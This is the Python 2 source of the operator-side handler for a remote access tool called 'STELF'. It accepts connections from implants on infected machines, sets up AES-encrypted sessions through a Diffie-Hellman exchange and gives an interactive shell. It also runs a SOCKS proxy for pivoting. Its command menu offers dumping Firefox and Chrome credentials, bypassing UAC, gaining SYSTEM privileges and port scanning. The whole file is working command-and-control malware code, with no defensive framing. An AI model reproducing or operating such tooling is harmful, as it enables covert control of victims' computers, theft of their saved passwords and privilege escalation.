#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# from __future__ import unicode_literals
import socket, sys, json, base64, random, hashlib, signal, threading, time, zlib, Queue, select, os
from Crypto.Cipher import AES
from colorama import init, Fore, Style
import readline

init(autoreset=True)

import __builtin__ 

def raw_input2(prompt=''): 
	try: 
		return raw_input1(prompt) 
	except EOFError as exc: 
		time.sleep(0.05) 
		raise 

raw_input1 = raw_input 
__builtin__.raw_input = raw_input2 


INFO = Style.BRIGHT + Fore.BLUE + "\n[*] " + Style.RESET_ALL
BAD = Style.BRIGHT + Fore.RED + "\n[-] " + Style.RESET_ALL
GOOD = Style.BRIGHT + Fore.GREEN + "\n[+] " + Style.RESET_ALL

class StoppableThread(threading.Thread):
	def __init__(self, target):
		super(StoppableThread, self).__init__()
		self.run = target
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()

class Client:
	def __init__(self, id, socket, address, port, key, IV):
		self.id = id
		
		self.sock = socket
		self.address = address
		self.port = port
		
		self.enc_key = key
		self.enc_IV = IV
		
		self.aes_obj = AES.new(self.enc_key, AES.MODE_CFB, self.enc_IV)
		
		self.cwd = GOOD + "Starting interaction with "+str(self.id)+" "
		self.prompt = self.cwd + ">>"
		
		self.threads = []
		
	def encrypt(self, data):
		return base64.b64encode(self.compress(self.aes_obj.encrypt(data)))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(self.decompress(base64.b64decode(data)))
		
	def compress(self, data):
		return zlib.compress(data, 9)
		
	def decompress(self, data):
		return zlib.decompress(data)
		
	def send(self, data):
		self.sock.sendall(self.encrypt(data)+chr(255))
		
	def recv(self):
		self.sock.settimeout(70)
		try:
			data = ""
			while not data.endswith(chr(255)):
				c = self.sock.recv(4096)
				if not c: raise Exception("Client Disconnected")
				data += c
		except Exception as e:
			self.sock.settimeout(None)
			raise Exception("Client Disconnected")
		
		self.sock.settimeout(None)
		return self.decrypt(data)
		
	def make_prompt(self, data_package):
		if data_package["username"] and data_package["hostname"]:
			self.prompt = data_package["localtime"] + " " +\
							data_package["username"] + "@" +\
							data_package["hostname"] + " " +\
							data_package["cwd"] + ">>"

		else:
			self.prompt = data_package["localtime"] + " " +\
							data_package["username"] + " " +\
							data_package["hostname"] + " " +\
							data_package["cwd"] + ">>"
							
		self.prompt = self.prompt.strip()
		
	def tab_completer(self, text, state):
		self.send("LIST_FILES "+text)
		data = self.recv()
		data_package = json.loads(data)
		for key in data_package:
			data_package[key] = base64.b64decode(data_package[key])
		files = data_package["data"].split("|")
		return str(files[state])
		
	def socks_proxy(self):
		current_thread = threading.currentThread()
	
		local_proxy_socket = socket.socket()
		local_proxy_socket.bind(("0.0.0.0", 3080))
		local_proxy_socket.listen(5)
		
		remote_proxy_socket = socket.socket()
		remote_proxy_socket.bind(("0.0.0.0", 4080))
		remote_proxy_socket.listen(5)
		
		while not current_thread.stopped():
			remote_socket, addr = remote_proxy_socket.accept()
			local_socket, addr = local_proxy_socket.accept()
			
			while not current_thread.stopped():
				try:
					readable, writable, errored = select.select([local_socket, remote_socket], [], [])
				except Exception as e:
					print e
					break
				
				if local_socket in readable:
					try:
						local_data = local_socket.recv(4096)
						if not local_data: break
						remote_socket.sendall(local_data)
					except Exception as e:
						print e
						break
				
				if remote_socket in readable:
					try:
						remote_data = remote_socket.recv(4096)
						if not remote_data: break
						local_socket.sendall(remote_data)
					except Exception as e:
						print e
						break
						
			local_socket.close()
			remote_socket.close()
			
		local_proxy_socket.close()
		remote_proxy_socket.close()
			
		
	def create_socks_proxy(self):
		t = StoppableThread(target=self.socks_proxy)
		t.daemon = True
		t.start()
		self.threads.append(t)
		
	def stop_socks_proxy(self):
		for t in self.threads:
			t.stop()
		try:
			s = socket.socket()
			s.connect(("localhost",3080))
			s.close()
		except: pass
		try:
			s = socket.socket()
			s.connect(("localhost",4080))
			s.close()
		except: pass
		
	def interact(self):
		readline.parse_and_bind("tab: complete")
		readline.set_completer(self.tab_completer)
		
		while True:
			try:
				user_input = raw_input(u"\n" + unicode(self.prompt, errors='ignore') + " ")
			except KeyboardInterrupt:
			    print INFO + "User requested exit."
			    break
			if user_input == "help":
				print INFO + "Available commands:"
				print " - prompt - Modifies the prompt aesthetics."
				print " - crash - Crashes the shell like Ayrton Senna."
				print " - test - Returns 'ass' on windows."
				print " - proxy [start|stop] - Starts or stops socks4 proxy."
				print " - dumpff - Dumps Firefox Credientials."
				print " - dumpchrome - Dumps Chrome Credientials."
				print " - isadmin - Prints whether the current process has admin privileges."
				print " - bypassuac - Attempts to bypass UAC."
				print " - getsystem - If current user is an admin, attempts to get system privileges."
				print " - portscan [hosts] [ports] - Scans given hosts and ports."
			else:
				try:
					if not user_input: continue
					
					if user_input.startswith("proxy start"):
						self.create_socks_proxy()
					elif user_input.startswith("proxy stop"):
						self.stop_socks_proxy()
					self.send(user_input)
					
					data = self.recv()
				
					data_package = json.loads(data)
					for key in data_package:
						data_package[key] = base64.b64decode(data_package[key])
			
					self.make_prompt(data_package)
			
					sys.stdout.write(data_package["data"])
					if data_package["data"].startswith("A new session with"):
						raise Exception("Going back to handler.")
				
				except Exception as e:
						if str(e) == "Going back to handler.":
							print INFO + str(e)
							break
						print BAD + str(e)
						del handler.clients[self.id]
						break
		

		
class Handler:
	def __init__(self, bind, port):
		self.bind = bind
		self.port = port

		self.server_sock = socket.socket()
		self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.interacting = False

		self.server_sock.bind((self.bind, self.port))
		self.server_sock.listen(5)

		self.commands = []
		
		self.clients = []
		#signal.signal(signal.SIGINT, self.signal_handler)

	def gen_diffie_key(self, client):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		client_key = client.recv(4096)
		client.sendall(str(public_key))
		
		sharedSecret = pow(int(client_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		return key, IV
		
	  
	def signal_handler(self, signal, frame):
		print "\n\rBye Bye!"
		self.server_sock.close()
		sys.exit(0)
		
	def accept_clients(self):
		while True:
			client, addr = self.server_sock.accept()
			key, IV = self.gen_diffie_key(client)

			c = Client(len(self.clients), client, addr[0], addr[1], key, IV)
			self.clients.append(c)
			
			if not self.interacting:
				sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
				print INFO + "STELF session "+str(c.id)+" opened ("+c.address+":"+str(c.port)+" -> "+self.bind+":"+str(self.port)+")\n"
				sys.stdout.write(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
				sys.stdout.flush()
			
	def start(self):
		print INFO + "STELF handler ready."
		t = threading.Thread(target=self.accept_clients)
		t.daemon = True
		t.start()
		while True:
			try:
				user_input = raw_input(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> ")
			except KeyboardInterrupt:
				print INFO + "User requested shutdown."
				os._exit(0)
			if user_input == "list" or user_input == "l":
				print INFO + "Current active sessions:"
				print "========================"
				for c in self.clients:
					print "["+str(c.id)+"]: " + c.address + ":" + str(c.port)
					
				print"\n========================"
					
			elif user_input.startswith("interact") or user_input.split()[0] == "i":
				try:
					req_id = int(user_input.split()[1])
					self.interacting = True
					found = False
					for client in self.clients:
						if client.id == req_id:
							found = True
							client.interact()
					if not found: print BAD + "ID not found."
					self.interacting = False
				except Exception as e:
					self.interacting = False
					if not str(e).startswith("list assignment"):
						print BAD + str(e)
					
			elif user_input == "exit":
				print INFO + "User requested shutdown."
				os._exit(0)
							
handler = Handler("0.0.0.0", 8080)
handler.start()
